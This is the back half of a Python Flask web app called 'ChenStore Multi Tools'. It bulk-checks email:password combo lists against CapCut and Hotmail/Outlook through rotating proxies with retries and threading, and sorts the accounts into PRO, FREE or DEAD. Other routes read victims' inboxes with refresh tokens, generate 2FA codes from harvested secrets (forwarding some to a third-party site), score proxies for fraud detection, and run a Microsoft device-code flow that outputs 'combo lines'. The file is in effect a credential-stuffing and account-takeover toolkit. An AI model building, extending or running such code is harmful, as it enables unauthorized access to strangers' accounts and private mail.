                <tr><td class="font-monospace text-warning">text</td><td>string</td><td><span class="badge bg-danger">Wajib</span></td><td>Teks multiline dari file .txt</td></tr>
                <tr><td class="font-monospace text-warning">mode</td><td>string</td><td>Opsional</td><td><code>"outlook"</code> atau <code>"capcut"</code> (default: "capcut")</td></tr>
              </tbody>
            </table>
          </div>
        </div>
      </section>

    </main>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
  <script>
    document.addEventListener('DOMContentLoaded', () => {
      const baseEl = document.getElementById('baseUrlDisplay');
      if (baseEl) {
        baseEl.textContent = window.location.origin;
      }
    });

    function copyCode(btn) {
      const container = btn.closest('.code-container');
      const code = container.querySelector('.code-block').innerText;
      navigator.clipboard.writeText(code).then(() => {
        const orig = btn.innerText;
        btn.innerText = 'Copied!';
        btn.classList.replace('btn-outline-warning', 'btn-success');
        setTimeout(() => {
          btn.innerText = orig;
          btn.classList.replace('btn-success', 'btn-outline-warning');
        }, 1500);
      });
    }
  </script>
  <div id="chenToastContainer"></div>
</body>
</html>
"""

# ==================== FLASK ROUTES ====================

@app.route("/docs")
@app.route("/api/docs")
def serve_docs():
    return render_template_string(DOCS_TEMPLATE, favicon_b64=FAVICON_B64)

@app.route("/manifest.json")
def serve_manifest():
    return jsonify({
        "name": "ChenStore Multi Tools",
        "short_name": "ChenStore",
        "start_url": "/",
        "display": "standalone",
        "background_color": "#0f0a06",
        "theme_color": "#0f0a06",
        "icons": [
            {
                "src": "/logo.png",
                "sizes": "192x192 512x512",
                "type": "image/png"
            }
        ]
    })

@app.route("/", methods=["GET", "POST"])
@app.route("/api/index.py", methods=["GET", "POST"])
@app.route("/api/index", methods=["GET", "POST"])
@app.route("/api", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        # Check action from query parameter or JSON payload
        action = request.args.get("action", "")
        payload = {}
        try:
            payload = request.get_json(force=True, silent=True) or {}
        except Exception:
            pass
        if not action:
            action = payload.get("action", "")

        if action == "mail_message" or "message_id" in payload:
            return api_mail_message()
        elif action == "mail_inbox" or ("refresh_token" in payload and "email" not in payload and "password" not in payload):
            return api_mail_inbox()
        elif action == "check_single_outlook" or ("refresh_token" in payload and "email" in payload):
            return api_check_single_outlook()
        elif action == "check_single_capcut" or ("email" in payload and "password" in payload and "refresh_token" not in payload):
            return api_check_single_capcut()
        elif action == "check_single_proxy" or ("proxy" in payload and "email" not in payload and "refresh_token" not in payload):
            return api_check_single_proxy()
        elif action == "parse_proxies":
            return api_parse_proxies()
        elif action == "2fa_generate" or "secrets" in payload:
            return api_2fa_generate()
        elif action == "check_single_hotmail" or action == "hotmail_check_single":
            return api_hotmail_check_single()
        elif action == "parse_accounts" or "mode" in payload:
            return api_parse_accounts()
        elif action == "check_capcut" or "accounts_text" in payload:
            return api_check_capcut()
        elif action == "check_outlook":
            return api_check_outlook()
        
    default_proxy = os.environ.get("CAPCUT_PROXY", "")
    return render_template_string(HTML_TEMPLATE, default_proxy=default_proxy, favicon_b64=FAVICON_B64)


@app.route("/logo.png")
@app.route("/favicon.ico")
def serve_logo():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    candidates = [
        os.path.join(script_dir, "logo.png"),
        os.path.join(script_dir, "favicon.png"),
        os.path.join(os.path.dirname(script_dir), "logo.png"),
        os.path.join(os.path.dirname(script_dir), "favicon.png"),
        os.path.join(os.getcwd(), "logo.png"),
        os.path.join(os.getcwd(), "favicon.png")
    ]
    for target in candidates:
        if os.path.isfile(target):
            return send_from_directory(os.path.dirname(target), os.path.basename(target), mimetype="image/png")
    # Fallback to embedded base64 bytes
    try:
        raw_bytes = base64.b64decode(FAVICON_B64)
        return Response(raw_bytes, mimetype="image/png", headers={"Cache-Control": "public, max-age=86400"})
    except Exception:
        return Response(b"", status=404)

@app.route("/api/check", methods=["POST"])
def api_check_capcut():
    payload = request.get_json(force=True)
    accounts_text = payload.get("accounts_text", "")
    proxy_url = payload.get("proxy", "").strip() or os.environ.get("CAPCUT_PROXY", "")
    workers = int(payload.get("workers", 6))
    retries = int(payload.get("retries", 6))

    accounts = parse_capcut_accounts(accounts_text)
    total = len(accounts)

    def generate():
        yield json.dumps({"type": "init", "total": total}) + "\n"
        if total == 0:
            return

        def _do_check(item):
            email, pw = item
            res = check_capcut_account(
                email, pw, proxy_template=proxy_url, max_ip_retries=retries
            )
            res["password"] = pw
            res["status"] = "PRO" if (res.get("ok") and res.get("is_pro")) else ("FREE" if res.get("ok") else "DEAD")
            return res

        with ThreadPoolExecutor(max_workers=max(1, min(workers, 30))) as pool:
            futures = [pool.submit(_do_check, acc) for acc in accounts]
            for fut in as_completed(futures):
                try:
                    result = fut.result()
                except Exception as e:
                    result = {"ok": False, "email": "unknown", "password": "", "status": "DEAD", "error": str(e)}
                yield json.dumps({"type": "result", "total": total, "data": result}) + "\n"

    return Response(generate(), mimetype="application/x-ndjson")

@app.route("/api/check_outlook", methods=["POST"])
def api_check_outlook():
    payload = request.get_json(force=True)
    accounts_text = payload.get("accounts_text", "")
    proxy_url = payload.get("proxy", "").strip() or None
    workers = int(payload.get("workers", 8))

    items = parse_outlook_lines(accounts_text)
    total = len(items)

    def generate():
        yield json.dumps({"type": "init", "total": total}) + "\n"
        if total == 0:
            return

        def _do_check_outlook(item):
            res = check_outlook_account(
                email=item["email"],
                password=item["password"],
                refresh_token=item["refresh_token"],
                client_id=item["client_id"],
                proxy=proxy_url
            )
            return res

        with ThreadPoolExecutor(max_workers=max(1, min(workers, 30))) as pool:
            futures = [pool.submit(_do_check_outlook, it) for it in items]
            for fut in as_completed(futures):
                try:
                    result = fut.result()
                except Exception as e:
                    result = {"ok": False, "email": "unknown", "password": "", "status": "DEAD", "error": str(e), "refresh_token": "", "client_id": ""}
                yield json.dumps({"type": "result", "total": total, "data": result}) + "\n"

    return Response(generate(), mimetype="application/x-ndjson")

@app.route("/check_single_capcut", methods=["POST"])
@app.route("/api/check_single_capcut", methods=["POST"])
def api_check_single_capcut():
    payload = request.get_json(force=True)
    email = payload.get("email", "").strip()
    pw = payload.get("password", "").strip()
    proxy_url = payload.get("proxy", "").strip() or os.environ.get("CAPCUT_PROXY", "")
    retries = int(payload.get("retries", 6))

    res = check_capcut_account(email, pw, proxy_template=proxy_url, max_ip_retries=retries)
    res["password"] = pw
    res["status"] = "PRO" if (res.get("ok") and res.get("is_pro")) else ("FREE" if res.get("ok") else "DEAD")
    return jsonify(res)

@app.route("/parse_accounts", methods=["POST"])
@app.route("/api/parse_accounts", methods=["POST"])
def api_parse_accounts():
    payload = request.get_json(force=True)
    text = payload.get("text", "")
    mode = payload.get("mode", "capcut")

    if mode == "capcut":
        accounts = parse_capcut_accounts(text)
        return jsonify([{"email": a[0], "password": a[1]} for a in accounts])
    else:
        items = parse_outlook_lines(text)
        return jsonify(items)

@app.route("/check_single_outlook", methods=["POST"])
@app.route("/api/check_single_outlook", methods=["POST"])
def api_check_single_outlook():
    payload = request.get_json(force=True)
    email = payload.get("email", "")
    password = payload.get("password", "")
    refresh_token = payload.get("refresh_token", "")
    client_id = payload.get("client_id", DEFAULT_CLIENT_ID)
    proxy_url = payload.get("proxy", "").strip() or None

    res = check_outlook_account(
        email=email,
        password=password,
        refresh_token=refresh_token,
        client_id=client_id,
        proxy=proxy_url
    )
    return jsonify(res)

@app.route("/mail/inbox", methods=["POST"])
@app.route("/api/mail/inbox", methods=["POST"])
def api_mail_inbox():
    payload = request.get_json(force=True)
    refresh_token = payload.get("refresh_token", "")
    client_id = payload.get("client_id", DEFAULT_CLIENT_ID)
    proxy = payload.get("proxy") or None

    data = fetch_inbox_messages(refresh_token=refresh_token, client_id=client_id, proxy=proxy, top=40)
    return jsonify(data)

@app.route("/mail/message", methods=["POST"])
@app.route("/api/mail/message", methods=["POST"])
def api_mail_message():
    payload = request.get_json(force=True)
    message_id = payload.get("message_id", "")
    refresh_token = payload.get("refresh_token", "")
    client_id = payload.get("client_id", DEFAULT_CLIENT_ID)
    proxy = payload.get("proxy") or None

    data = fetch_message_detail(message_id=message_id, refresh_token=refresh_token, client_id=client_id, proxy=proxy)
    return jsonify(data)

@app.route("/api/oauth/device/start", methods=["POST"])
def api_oauth_device_start():
    payload = request.get_json(force=True) or {}
    client_id = payload.get("client_id") or DEFAULT_CLIENT_ID
    scope = payload.get("scope") or "offline_access https://graph.microsoft.com/Mail.Read User.Read"
    try:
        r = requests.post(
            "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode",
            data={"client_id": client_id, "scope": scope},
            timeout=15
        )
        if r.status_code == 200:
            return jsonify({"ok": True, "data": r.json()})
        else:
            return jsonify({"ok": False, "error": r.text}), 400
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500

@app.route("/api/oauth/device/poll", methods=["POST"])
def api_oauth_device_poll():
    payload = request.get_json(force=True) or {}
    client_id = payload.get("client_id") or DEFAULT_CLIENT_ID
    device_code = payload.get("device_code", "").strip()
    if not device_code:
        return jsonify({"ok": False, "error": "device_code is required"}), 400
    try:
        r = requests.post(
            "https://login.microsoftonline.com/common/oauth2/v2.0/token",
            data={
                "client_id": client_id,
                "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
                "device_code": device_code
            },
            timeout=15
        )
        res_data = r.json()
        if r.status_code == 200:
            refresh_token = res_data.get("refresh_token", "")
            access_token = res_data.get("access_token", "")
            email = "microsoft_user@hotmail.com"
            if access_token:
                try:
                    me_res = requests.get(
                        "https://graph.microsoft.com/v1.0/me",
                        headers={"Authorization": f"Bearer {access_token}"},
                        timeout=10
                    )
                    if me_res.status_code == 200:
                        me_data = me_res.json()
                        email = me_data.get("userPrincipalName") or me_data.get("mail") or email
                except Exception:
                    pass
            combo_line = f"{email}|password|{refresh_token}|{client_id}"
            return jsonify({
                "ok": True,
                "status": "success",
                "email": email,
                "refresh_token": refresh_token,
                "client_id": client_id,
                "combo_line": combo_line
            })
        elif res_data.get("error") == "authorization_pending":
            return jsonify({"ok": True, "status": "pending"})
        elif res_data.get("error") == "authorization_declined":
            return jsonify({"ok": False, "status": "declined", "error": "Otorisasi dibatalkan / ditolak pengguna."})
        elif res_data.get("error") == "expired_token":
            return jsonify({"ok": False, "status": "expired", "error": "Waktu otorisasi telah habis. Silakan coba kembali."})
        else:
            return jsonify({"ok": False, "status": "error", "error": res_data.get("error_description") or res_data.get("error") or "Gagal mendapatkan token"})
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500

@app.route("/check_single_proxy", methods=["POST"])
@app.route("/api/check_single_proxy", methods=["POST"])
def api_check_single_proxy():
    payload = request.get_json(force=True) or {}
    proxy_str = payload.get("proxy", "").strip()
    timeout = float(payload.get("timeout", 8.0))
    check_scamalytics = bool(payload.get("check_scamalytics", False))

    if not proxy_str:
        return jsonify({"ok": False, "live": False, "error": "No proxy provided", "latency_ms": 0}), 400

    res = check_single_proxy_connectivity(proxy_str, timeout=timeout, check_scamalytics=check_scamalytics)
    return jsonify(res)

@app.route("/parse_proxies", methods=["POST"])
@app.route("/api/parse_proxies", methods=["POST"])
def api_parse_proxies():
    payload = request.get_json(force=True) or {}
    text = payload.get("text", "")
    items = parse_proxy_lines(text)
    return jsonify(items)

@app.route("/2fa/generate", methods=["POST"])
@app.route("/api/2fa/generate", methods=["POST"])
def api_2fa_generate():
    payload = request.get_json(force=True) or {}
    secrets = payload.get("secrets", [])
    if isinstance(secrets, str):
        secrets = [s.strip() for s in secrets.split(",") if s.strip()]
    
    if not secrets:
        return jsonify({"ok": False, "error": "No secret provided", "data": []}), 400

    results = []
    for s in secrets:
        clean_s = re.sub(r"[\s\-]+", "", str(s)).upper()
        code = generate_totp_code(clean_s)
        if code:
            results.append({
                "secret": clean_s,
                "code": code,
                "error": ""
            })
        else:
            code_fallback = ""
            err_msg = "Invalid base32 secret"
            if clean_s:
                try:
                    r = requests.get(f"https://twofa.co/api/{clean_s}", headers={"User-Agent": UA}, timeout=4)
                    if r.status_code == 200:
                        res_data = r.json()
                        if isinstance(res_data, dict):
                            code_fallback = str(res_data.get("code") or res_data.get("token") or "")
                            if res_data.get("error"):
                                err_msg = res_data.get("error")
                except Exception:
                    pass

            if code_fallback:
                results.append({
                    "secret": clean_s,
                    "code": code_fallback,
                    "error": ""
                })
            else:
                results.append({
                    "secret": clean_s,
                    "code": "",
                    "error": err_msg
                })

    return jsonify({"ok": True, "data": results})

@app.route("/api/hotmail/check_single", methods=["POST"])
def api_hotmail_check_single():
    payload = request.get_json(force=True) or {}
    email = payload.get("email", "")
    password = payload.get("password", "")
    proxy_url = payload.get("proxy", "") or None
    timeout = int(payload.get("timeout", 15))
    res = check_single_hotmail(email, password, proxy_url=proxy_url, timeout=timeout)
    return jsonify(res)

@app.after_request
def add_no_cache_headers(response):
    response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
    response.headers["Pragma"] = "no-cache"
    response.headers["Expires"] = "0"
    return response

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    print(f"Starting Multi-Checker Web on http://0.0.0.0:{port} ...")
    app.run(host="0.0.0.0", port=port, debug=False)
